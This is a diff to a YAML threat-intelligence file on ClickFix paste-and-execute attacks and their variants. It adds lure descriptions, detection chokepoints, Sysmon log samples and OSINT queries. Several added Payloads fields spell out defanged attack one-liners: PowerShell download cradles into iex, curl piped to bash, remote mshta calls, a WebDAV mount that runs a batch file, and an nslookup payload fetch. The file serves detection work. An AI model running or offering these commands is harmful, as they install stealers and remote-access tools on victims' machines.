@@ -28,6 +28,22 @@ Variations:
   Notes: Original variant; first documented by Proofpoint in March 2024 via TA571; fake CAPTCHA or browser fix prompts user
     to paste PowerShell into Run dialog or terminal
   VariantId: clickfix
+  Lure: 'Fake Cloudflare CAPTCHA or reCAPTCHA page. User clicks "I''m not a robot" checkbox, then page displays
+    "Verification Steps" instructing: 1. Press Win+R 2. Press Ctrl+V 3. Press Enter. The clipboard is silently loaded
+    with the payload before the user sees the instructions. Each visit shows the user''s actual domain and a random
+    Cloudflare Ray ID to reinforce legitimacy.'
+  LureTags:
+  - Cloudflare impersonation
+  - '"I''m not a robot"'
+  - Win+R instruction
+  - Fake Ray ID
+  Payloads:
+  - Platform: Windows
+    Command: 'powershell -w 1 iwr hxxps[://]daoeidk[.]info | iex  #  Verification Code 665216'
+    Note: 'The "# Verification Code" comment is cosmetic — makes the command look like a CAPTCHA token in the Run dialog.
+      The actual logic: iwr (Invoke-WebRequest) fetches an encoded PowerShell loader, piped to iex (Invoke-Expression) for
+      immediate execution. Delivers Lumma Stealer.'
+  ChokepointMapping: 'clipboard write → powershell.exe (parent: explorer.exe) → outbound HTTP to fetch second stage'
 - Name: FileFix
   FirstSeen: 2025-Q2
   Status: Active
@@ -36,18 +52,61 @@ Variations:
   Notes: Published by researcher mr.d0x on June 23, 2025; shifts attack surface from Run dialog to Windows File Explorer address
     bar; in-the-wild campaigns observed within two weeks of public disclosure
   VariantId: filefix
+  Lure: 'Same CAPTCHA/verification pretext as ClickFix, but with a file upload button (<input type="file">) that opens the
+    Windows File Explorer. User is instructed to paste into the File Explorer address bar instead of the Run dialog.'
+  LureTags:
+  - File Explorer address bar
+  - '<input type="file"> button'
+  - Whitespace padding
+  Payloads:
+  - Platform: Windows
+    Command: "\\\\attacker-server[.]com\\share\\payload.hta                    \u2190 visible in address bar\npowershell
+      -ep bypass -w hidden -enc JABjAGwAaQBlAG4... \u2190 hidden via whitespace padding"
+    Note: 'The visible portion looks like a file path. The actual PowerShell command is hidden after a large block of
+      whitespace so it doesn''t appear in the File Explorer address bar. The user sees what looks like a UNC path; the
+      system executes the hidden command.'
+  ChokepointMapping: 'clipboard write → powershell.exe or mshta.exe (parent: explorer.exe) → outbound connection'
 - Name: TerminalFix
   FirstSeen: 2024-Q4
   Status: Active
+  SourceURL: https://huntress.com/blog/dont-sweat-clickfix-techniques
   NotesShort: Mimics terminal windows; targets IT-savvy users with same execution path
   Notes: Mimics terminal windows; targets IT-savvy users, still same execution path
   VariantId: terminalfix
+  Lure: 'Mimics a terminal/console window UI. Instructs the user to open PowerShell directly (not Run dialog) and paste.
+    Includes OS detection via navigator.platform to serve different payloads for Windows vs macOS.'
+  LureTags:
+  - Terminal UI impersonation
+  - '"Open PowerShell"'
+  - OS detection
+  - Dual payloads
+  Payloads:
+  - Platform: Windows
+    Command: "powershell -ep bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('hxxps[://]cdn-update[.]net/stage2.ps1')\""
+    Note: 'Download cradle via PowerShell. Windows users are told to open PowerShell directly.'
+  - Platform: macOS
+    Command: 'curl -sL hxxps[://]cdn-update[.]net/stage2.sh | bash'
+    Note: 'macOS users told to open Terminal. Same clipboard-paste-execute chain, different interpreter.'
+  ChokepointMapping: 'clipboard write → powershell.exe or bash (parent: varies) → outbound download cradle'
 - Name: DownloadFix
   FirstSeen: 2024-Q4
   Status: Active
+  SourceURL: https://huntress.com/blog/dont-sweat-clickfix-techniques
   NotesShort: Simplified delivery; user pastes a download-and-execute one-liner
   Notes: Simplified delivery; user pastes a download-and-execute one-liner
   VariantId: downloadfix
+  Lure: 'Simplified — no fake CAPTCHA or terminal impersonation. Lure presents a "download required" pretext (missing codec,
+    browser update, document viewer) with a single one-liner for the user to paste.'
+  LureTags:
+  - '"Download required"'
+  - Simplified pretext
+  - One-liner paste
+  Payloads:
+  - Platform: Windows
+    Command: "powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('hxxps[://]update-service[.]net/dl.ps1')\""
+    Note: 'Minimal obfuscation — straightforward download cradle. The simplicity is the point: fewer instructions for the
+      user to follow means higher conversion rate. Download cradle fetches a second-stage loader.'
+  ChokepointMapping: 'clipboard write → powershell.exe (parent: explorer.exe) → outbound HTTP download cradle'
 - Name: JackFix / GlitchFix / ConsentFix
   FirstSeen: '2025'
   Status: Active
@@ -56,6 +115,22 @@ Variations:
   Notes: Expanding family of named variants using the same clipboard-paste-execute primitive with different social engineering
     pretexts (consent dialogs, glitch/error UIs); same chokepoint applies
   VariantId: jackfix-glitchfix-consentfix
+  Lure: 'Expanding family using different social engineering pretexts: ConsentFix uses fake OAuth/consent dialogs ("Allow
+    access to continue"). GlitchFix uses fake glitch/error UI ("Display driver error — paste fix"). JackFix uses fake
+    browser hijack warnings ("Security alert — paste to resolve"). All use the same clipboard-paste-execute primitive
+    with different visual wrappers.'
+  LureTags:
+  - Consent dialogs
+  - Glitch/error UIs
+  - Browser hijack warnings
+  - Same primitive
+  Payloads:
+  - Platform: Windows
+    Command: 'mshta hxxps[://]consent-verify[.]com/auth.hta'
+    Note: 'These variants primarily use mshta as the interpreter, calling an HTA file from a remote URL. The HTA contains
+      VBScript or JScript that downloads and executes the real payload. The social engineering pretext varies but the
+      technical chain is identical across all three.'
+  ChokepointMapping: 'clipboard write → mshta.exe (parent: explorer.exe) → outbound HTTP to fetch HTA'
 - Name: WebDAV ClickFix
   FirstSeen: 2025-Q1
   Status: Active
@@ -67,6 +142,21 @@ Variations:
     used to hide shellcode in PNG images; payloads include LummaStealer, Xworm, AsyncRAT, NetSupport, and a modified r77 rootkit;
     tactics first observed February 2024, campaign volume spiked September 2024, detailed analysis published February 2026
   VariantId: webdav-clickfix
+  Lure: 'Fake verification page or document access prompt. User pastes a command that mounts a WebDAV share as a local drive,
+    executes a batch file or HTA from the share, then removes the mapping. Some variants deliver .url or .lnk shortcut
+    files instead.'
+  LureTags:
+  - WebDAV share mount
+  - net use command
+  - Fileless execution
+  - No PowerShell
+  Payloads:
+  - Platform: Windows
+    Command: 'cmd.exe /c net use Z: hxxp[://]94.156.170[.]255/webdav /persistent:no && "Z:\update.cmd" & net use Z: /delete'
+    Note: 'No PowerShell or mshta — uses net use to mount a WebDAV share, execute update.cmd from the mapped drive, and
+      delete the mapping immediately. Bypassed Microsoft Defender for Endpoint out-of-box detection. Only detected through
+      RunMRU registry key threat hunting at Atos.'
+  ChokepointMapping: 'clipboard write → cmd.exe (parent: explorer.exe) → outbound WebDAV mount to attacker IP'
 - Name: InstallFix
   FirstSeen: 2026-Q1
   Status: Active
@@ -78,6 +168,24 @@ Variations:
     → conhost.exe → Amatera infostealer; also targets macOS; documented by PushSecurity and BleepingComputer, February–March
     2026'
   VariantId: installfix
+  Lure: 'Pixel-perfect clone of official CLI tool install pages (Claude Code, NotebookLM). Includes layout, branding,
+    documentation sidebar, and code blocks. Only difference: the install command URL points to an attacker-controlled domain.
+    Distributed via Google Ads malvertising for queries like "Claude Code install." No fake error or CAPTCHA needed — the
+    pretext is the user wanting to install software.'
+  LureTags:
+  - Cloned docs page
+  - curl | bash one-liner
+  - No CAPTCHA / no error
+  - Malvertising delivery
+  Payloads:
+  - Platform: macOS
+    Command: 'curl -sL hxxps[://]attacker-domain[.]com/install.sh | bash'
+    Note: 'macOS chain uses base64-encoded instructions fetched via curl.'
+  - Platform: Windows
+    Command: 'mshta hxxps[://]attacker-domain[.]co/payload'
+    Note: 'Windows chain spawns cmd.exe → mshta.exe → conhost.exe to deliver the Amatera infostealer. Pages hosted on
+      Cloudflare Pages, Squarespace, and Tencent EdgeOne.'
+  ChokepointMapping: 'clipboard write (user copies "install" command) → mshta.exe or bash → outbound fetch from attacker domain'
 - Name: Windows Terminal ClickFix
   FirstSeen: 2026-Q1
   Status: Active
@@ -89,6 +197,21 @@ Variations:
     (LOLBin); final payload is Lumma Stealer delivered via renamed 7-Zip binary extracting a malicious ZIP; uses QueueUserAPC
     injection into chrome.exe and msedge.exe for credential harvesting'
   VariantId: windows-terminal-clickfix
+  Lure: 'Lure page instructs users to open Windows Terminal via Win+X then I keyboard shortcut (instead of Win+R for Run
+    dialog). Designed to bypass Run-dialog-based detections since the parent process is wt.exe rather than explorer.exe.'
+  LureTags:
+  - 'Win+X → I shortcut'
+  - Windows Terminal
+  - Bypasses Run dialog detections
+  - wt.exe parent
+  Payloads:
+  - Platform: Windows
+    Command: "powershell -w hidden -ep bypass -enc WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAH...\n  \u2192 decodes to:
+      IEX (New-Object Net.WebClient).DownloadString('hxxps[://]c2-lumma[.]net/drop')"
+    Note: 'Hex-encoded XOR-compressed payload. Execution chain: wt.exe → powershell.exe → cmd.exe → MSBuild.exe (LOLBin).
+      Final payload is Lumma Stealer delivered via renamed 7-Zip binary extracting a malicious ZIP. Uses QueueUserAPC
+      injection into chrome.exe and msedge.exe for credential harvesting.'
+  ChokepointMapping: 'clipboard write → powershell.exe (parent: wt.exe) → outbound HTTP. Note: parent is wt.exe — hunt rules must include this parent.'
 - Name: DNS-based ClickFix
   FirstSeen: 2026-Q1
   Status: Active
@@ -100,13 +223,43 @@ Variations:
     payload, which downloads a ZIP, drops a Python-based RAT (ModeloRAT) via VBScript, and persists via a Startup folder shortcut;
     evades URL-based web filtering entirely
   VariantId: dns-based-clickfix
+  Lure: 'Lure instructs user to paste a command into the Run dialog. The command uses nslookup instead of HTTP to retrieve
+    the payload — evades URL-based web filtering entirely.'
+  LureTags:
+  - nslookup payload delivery
+  - DNS Name field response
+  - No HTTP involved
+  - Bypasses URL filtering
+  Payloads:
+  - Platform: Windows
+    Command: 'cmd /c "for /f "tokens=5" %a in (''nslookup example.com 84[.]21.189[.]20 2^>nul ^| find "Name"'') do powershell
+      -w hidden -c "%a"'
+    Note: 'Issues a DNS lookup against a threat-actor-controlled DNS server at 84[.]21.189[.]20. The response''s Name field
+      contains the PowerShell payload, extracted via for /f parsing and executed. No HTTP/HTTPS involved — payload delivery
+      is entirely via DNS. Final payload: Python-based RAT (ModeloRAT), persists via Startup folder shortcut.'
+  ChokepointMapping: 'clipboard write → cmd.exe → nslookup.exe → powershell.exe (parent: explorer.exe) → outbound DNS to attacker-controlled IP'
 Prerequisites:
 - Scripting interpreter available on target system (powershell.exe, cmd.exe, mshta.exe, bash)
 - Modern browser with Clipboard API enabled (default on all mainstream browsers)
+AttackerControls:
+- Lure design and social engineering pretext
+- Obfuscation and encoding of payload
+- Clipboard paste target (Run dialog, terminal, Explorer)
+- Delivery mechanism (compromised site, phishing, malvertising)
+- C2 infrastructure and staging domains
+AttackerCannotControl:
+- Clipboard write event via JavaScript API
+- Script interpreter must spawn as child process
+- Outbound network connection from interpreter
+- Process creation event logged (Sysmon EID 1)
+- Network connection event logged (Sysmon EID 3)
 Chokepoints:
-- Stage: Lure/Delivery
+- Stage: Clipboard Seeding
+  Input: User visits attacker-controlled or compromised page in a modern browser with Clipboard API enabled
   Invariant: Browser renders a page combining a Clipboard API write with an explicit execution instruction, and writes malicious
     command content to the Windows clipboard via navigator.clipboard.writeText or ClipboardItem
+  Observable: 'Web proxy log shows page containing navigator.clipboard.writeText or ClipboardItem API call co-occurring
+    with execution instruction elements (Win+R, terminal, paste references)'
   WhyCantBypass: Co-occurrence of clipboard seeding and execution hint is the invariant fingerprint across all variants —
     no visual redesign removes both elements simultaneously; the user cannot execute content that was never placed there
   LogSources:
@@ -117,28 +270,46 @@ Chokepoints:
   DetectionTier: Research
   SigmaRef: iok-rules/clickfix/clickfix-lure.yml
   BypassNote: Clipboard ETW detection requires SilkETW or EDR with Win32k telemetry — not available via standard Sysmon configuration
-- Stage: Execution
-  Invariant: User pastes clipboard content into a scripting interpreter (powershell.exe, cmd.exe, mshta.exe, wt.exe) spawned
-    from a browser, explorer, or terminal parent
+  TruePositive:
+    Title: 'IOK match: ClickFix lure page with clipboard API'
+    Log: 'page.html: navigator.clipboard.writeText("powershell -w hidden -enc JABzAD0...") + div.innerText = "Press Win+R, paste, and hit Enter"'
+    KeySignal: clipboard_api + execution_hint co-occurrence
+- Stage: Interpreter Execution
+  Input: User pastes clipboard content into Run dialog (Win+R), terminal, or Explorer address bar
+  Invariant: User pastes clipboard content into a scripting interpreter (powershell.exe, cmd.exe, mshta.exe) spawned
+    from a browser, explorer, or terminal parent (wt.exe/WindowsTerminal.exe)
+  Observable: 'Sysmon EID 1 — process creation where Image is a script interpreter and ParentImage is explorer.exe,
+    browser process, or wt.exe/WindowsTerminal.exe'
   WhyCantBypass: The paste-and-execute action is the entire attack primitive — no variant skips the parent-process relationship
     between the delivery surface and the interpreter
   LogSources:
   - Sysmon Event ID 1 (Process Creation)
   - Windows Security Event ID 4688 (Process Creation)
   DetectionTier: Hunt
-  SigmaRef: sigma-rules/clickfix/analyst.yml
+  SigmaRef: sigma-rules/clickfix/hunt.yml
+  TruePositive:
+    Title: 'Sysmon EID 1: explorer.exe spawns powershell.exe with encoded command'
+    Log: 'ParentImage: C:\Windows\explorer.exe | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | CommandLine: powershell -w hidden -enc JABzAD0AbgBlAHcALQBvAGIAagBlAGMAdA...'
+    KeySignal: explorer.exe → powershell.exe with -enc flag
 - Stage: Second Stage Retrieval
+  Input: Script interpreter is running with attacker-supplied commands in the user's session context
   Invariant: Spawned interpreter makes an outbound connection to attacker infrastructure within seconds of execution to download
     the next stage or beacon home
+  Observable: 'Sysmon EID 3 — network connection where Image is a script interpreter, Initiated is true, and
+    DestinationIp is not RFC1918/loopback'
   WhyCantBypass: All payloads must retrieve a next stage or establish C2 — none are fully self-contained without any network
     contact
   LogSources:
   - Sysmon Event ID 3 (Network Connection)
   - Sysmon Event ID 22 (DNS Query)
   DetectionTier: Analyst
-  SigmaRef: sigma-rules/clickfix/hunt.yml
+  SigmaRef: sigma-rules/clickfix/hunt-network.yml
   BypassNote: Delayed execution (sleep before outbound) evades short time-window correlation — extend correlation window to
     5+ minutes in hunt and analyst rules
+  TruePositive:
+    Title: 'Sysmon EID 3: powershell.exe outbound to staging domain'
+    Log: 'Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | DestinationIp: 185.244.xxx.xxx | DestinationPort: 443 | Initiated: true'
+    KeySignal: interpreter outbound to non-RFC1918 IP within 30s of EID 1 event
 EvolutionTimeline:
 - Date: 2024-Q1
   Event: ClickFix Original
@@ -214,8 +385,8 @@ Detections:
 - Level: Research
   Description: Identify any scripting interpreter making outbound external connections
   LogSources:
-  - Windows Security Event Log (Process Creation / Event ID 4688)
   - Sysmon Event ID 3 (Network Connection)
+  - Sysmon Event ID 22 (DNS Query)
   - DNS query logs
   Logic: 'Process: powershell.exe OR cmd.exe OR wscript.exe OR cscript.exe OR mshta.exe Network: External destination (non-RFC1918)
     initiated by that process Parent: ANY
@@ -225,30 +396,31 @@ Detections:
   UseCase: Threat research baseline; understanding scripting interpreter network behavior
   SigmaRule: sigma-rules/clickfix/research.yml
 - Level: Hunt
-  Description: Scripting interpreter spawned by browser, explorer, or Windows Terminal with external network connection
+  Description: 'Scripting interpreter spawned by browser, explorer, or Windows Terminal —
+    process creation detection (Stage 2). For Stage 3 network confirmation, correlate
+    ProcessGuid with hunt-network.yml.'
   LogSources:
   - Sysmon Event ID 1 (Process Creation)
-  - Sysmon Event ID 3 (Network Connection)
-  - DNS query logs
-  Logic: 'Process: powershell.exe OR cmd.exe OR wscript.exe OR cscript.exe OR mshta.exe ParentProcess: explorer.exe OR wt.exe
-    OR WindowsTerminal.exe OR chrome.exe OR firefox.exe OR msedge.exe OR iexplore.exe OR brave.exe OR opera.exe Network: External
-    connection within 60 seconds of process start Additional pivot: nslookup.exe spawned by cmd.exe with a non-RFC1918 IP
-    as DNS server argument (KongTuke DNS-staging variant)
-
-    '
+  - Windows Security Event ID 4688 (Process Creation)
+  Logic: 'Process: powershell.exe OR cmd.exe OR wscript.exe OR cscript.exe OR mshta.exe
+    ParentProcess: explorer.exe OR wt.exe OR WindowsTerminal.exe
+    OR chrome.exe OR firefox.exe OR msedge.exe OR brave.exe OR opera.exe
+    Note: This rule is process_creation only — network correlation requires
+    hunt-network.yml joined by ProcessGuid in your SIEM.'
   ExpectedFPRate: Medium
   UseCase: Proactive hunting for user-initiated clipboard execution; campaign detection
   SigmaRule: sigma-rules/clickfix/hunt.yml
 - Level: Analyst
-  Description: Browser-spawned interpreter with encoded command and outbound connection to low-reputation destination
+  Description: 'Browser/explorer/terminal-spawned interpreter with encoded or obfuscated command
+    line (Stage 2 only — process creation). For Stage 3 network confirmation, correlate
+    ProcessGuid with hunt-network.yml.'
   LogSources:
   - Sysmon Event ID 1 (Process Creation)
-  - Sysmon Event ID 3 (Network Connection)
-  - Sysmon Event ID 22 (DNS Query)
-  - Parent process chain analysis
-  Logic: "Process: powershell.exe OR cmd.exe ParentProcess: [browser] OR explorer.exe CommandLine: Contains encoded command\
-    \ OR obfuscation pattern\n  (-enc, -EncodedCommand, FromBase64String, IEX, Invoke-Expression)\nNetwork: External connection\
-    \ within 30 seconds UserContext: Interactive logon session (LogonType 2 or 10)\n"
+  - Windows Security Event ID 4688 (Process Creation)
+  Logic: "Process: powershell.exe OR cmd.exe OR mshta.exe OR rundll32.exe\nParentProcess:\
+    \ [browser] OR explorer.exe OR wt.exe OR WindowsTerminal.exe\nCommandLine: Contains\
+    \ encoded command OR obfuscation pattern OR WebDAV/DNS indicators\n  (-enc, -EncodedCommand,\
+    \ FromBase64String, IEX, Invoke-Expression, net use, nslookup, rundll32 \\\\)\n"
   ExpectedFPRate: Low
   UseCase: Automated SOC alerting; immediate IR response trigger
   SigmaRule: sigma-rules/clickfix/analyst.yml
@@ -357,20 +529,20 @@ RelatedChokepoints:
 - ransomware-service-manipulation
 OsintSources:
 - Platform: URLScan
-  Query: (page.body:navigator.clipboard OR page.body:ClipboardItem) AND (page.title:*verify* OR page.title:*update* OR page.title:*captcha*)
-  URL: https://urlscan.io/search/#(page.body%3Anavigator.clipboard%20OR%20page.body%3AClipboardItem)%20AND%20(page.title%3A*verify*%20OR%20page.title%3A*captcha*)
-  Notes: Clipboard API presence anchored to deceptive page titles; retains cross-variant resilience while reducing false positives
-    from clipboard API alone.
+  Query: 'page.body:navigator.clipboard.writeText AND page.body:"Verify"'
+  URL: https://urlscan.io/search/#page.body%3Anavigator.clipboard.writeText%20AND%20page.body%3A%22Verify%22
+  Notes: 'Clipboard writeText API co-occurring with "Verify" text — catches CAPTCHA-themed ClickFix lures
+    across Cloudflare and reCAPTCHA impersonation variants.'
 - Platform: URLScan
-  Query: page.body:"I am not a robot" AND page.body:navigator.clipboard
+  Query: 'page.body:"I am not a robot" AND page.body:navigator.clipboard'
   URL: https://urlscan.io/search/#page.body%3A%22I%20am%20not%20a%20robot%22%20AND%20page.body%3Anavigator.clipboard
-  Notes: Fake CAPTCHA pages that write to the clipboard — the canonical ClickFix lure UI; high precision across Google reCAPTCHA
-    and Cloudflare impersonation variants.
+  Notes: 'Fake CAPTCHA pages that write to the clipboard — the canonical ClickFix lure. High precision
+    across reCAPTCHA and Cloudflare impersonation variants.'
 - Platform: URLScan
-  Query: page.body:navigator.clipboard AND (page.body:"Win+R" OR page.body:"Windows key" OR page.body:"Run dialog" OR page.body:"Ctrl+V")
+  Query: 'page.body:navigator.clipboard AND page.body:"Win+R"'
   URL: https://urlscan.io/search/#page.body%3Anavigator.clipboard%20AND%20page.body%3A%22Win%2BR%22
-  Notes: Targets pages instructing users to open Run dialog or paste commands — the execution instruction unique to ClickFix
-    and its variants.
+  Notes: 'Pages with clipboard API AND Run dialog instruction — the execution step unique to ClickFix.
+    Swap "Win+R" for "PowerShell" or "Terminal" to find TerminalFix variants.'
 - Platform: VirusTotal Intelligence
   Query: behavior_processes:"nslookup.exe" tag:powershell
   URL: https://www.virustotal.com/gui/search/behavior_processes%3A%22nslookup.exe%22%20tag%3Apowershell
@@ -392,7 +564,6 @@ RawLogs:
   Source: Microsoft-Windows-Sysmon/Operational
   Description: PowerShell spawned by Chrome with encoded command — the core ClickFix indicator
   MatchedRules:
-  - Research
   - Hunt
   - Analyst
   Sample: 'EventID: 1 (Process Create)
@@ -425,8 +596,7 @@ RawLogs:
   Source: Microsoft-Windows-Sysmon/Operational
   Description: DNS query from PowerShell to attacker C2 domain — DNS resolution phase
   MatchedRules:
-  - Research
-  - Analyst
+  - Hunt-Network
   Sample: 'EventID: 22 (DNS query)
 
     UtcTime: 2024-11-03 14:52:18.031
@@ -452,8 +622,7 @@ RawLogs:
   Description: Outbound network connection from PowerShell to C2 — payload download/beacon
   MatchedRules:
   - Research
-  - Hunt
-  - Analyst
+  - Hunt-Network
   Sample: 'EventID: 3 (NetworkConnect)
 
     UtcTime: 2024-11-03 14:52:18.247
